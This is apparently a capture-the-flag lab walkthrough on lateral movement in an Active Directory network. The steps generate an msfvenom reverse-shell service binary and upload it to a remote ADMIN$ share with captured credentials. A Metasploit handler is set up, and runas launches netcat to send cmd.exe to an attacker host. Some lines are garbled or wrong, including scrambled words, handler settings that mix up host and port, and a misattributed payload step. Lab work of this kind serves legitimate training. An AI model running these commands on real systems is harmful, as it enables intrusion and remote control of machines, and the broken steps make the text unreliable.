To complete this exercise and move laterally to THMIIS using the provided credentials, follow these steps:

1. Connect to THMJMP2 via SSH using the assigned credentials:
   ```bash
   ssh za\\\\\<AD Username\>@thmjmp2.za.tryhackme.com
   ```

2. Assume that you have captured administrative credentials:
   - User: ZA.TRYHACKME.COM\t1_leonard.summers
   - Password: EZpass4ever

3. Use `sc.exe` to create a reverse shell payload in the form of a service executable. This will prevent the payload from being killed by the service manager. Run the following command:
   ```bash
   msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
   ```

4. Upload the payload to the ADMIN\$ share of THMIIS using `smbclient` from your AttackBox:
   ```bash
   smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin\$/' EZpass4ever
   ```

5. Set up a listener on your Attacker Machine to receive the reverse shell. Use `msfconsole` and run the following commands:
   ```bash
   msfconsole
   use exploit/multi/handler
   set LHOST lateralmovement
   set RHOST 4444
   set payload windows/shell/reverse_tcp
   exploit
   ```

6. Since `sc.exe` doesn't allow specifying credentials in the command, use `runas` to spawn a new shell with t1_leonard.summers' access token. Runmand on the remote SSH connection: the following com
   ```bash
   runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c\tools\nc64.exe -e cmd.exe Attacker_IP 4443"
   ```

7. Start a NETCAT listener on your Attacker Machine:
   ```bash
   nc -nvlp 4443
   ```

8. After running the `runas` command, you should get a reverse connection inside NETCAT.

9. Proceed to create a new service remotely using `sc.exe` and associate it with the uploaded binary. Refer to the provided image for the exact command.

10. Finally, navigate to the leonard.summers user directory on THMIIS and find the flag.

Make sure to adapt the commands by replacing placeholders such as `AD Username`, `ATTACKER_IP`, and `lateralmovement` with the appropriate values.